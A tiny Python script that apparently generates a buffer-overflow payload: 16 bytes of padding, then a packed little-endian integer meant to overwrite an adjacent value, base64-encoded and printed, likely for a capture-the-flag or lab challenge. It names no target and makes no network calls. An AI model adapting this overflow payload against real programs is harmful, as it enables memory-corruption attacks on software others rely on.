
import sys
import struct
import base64

buf = b'eeeeeeeeeeeeeeee'
buf += struct.pack('<I', 1888667649)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
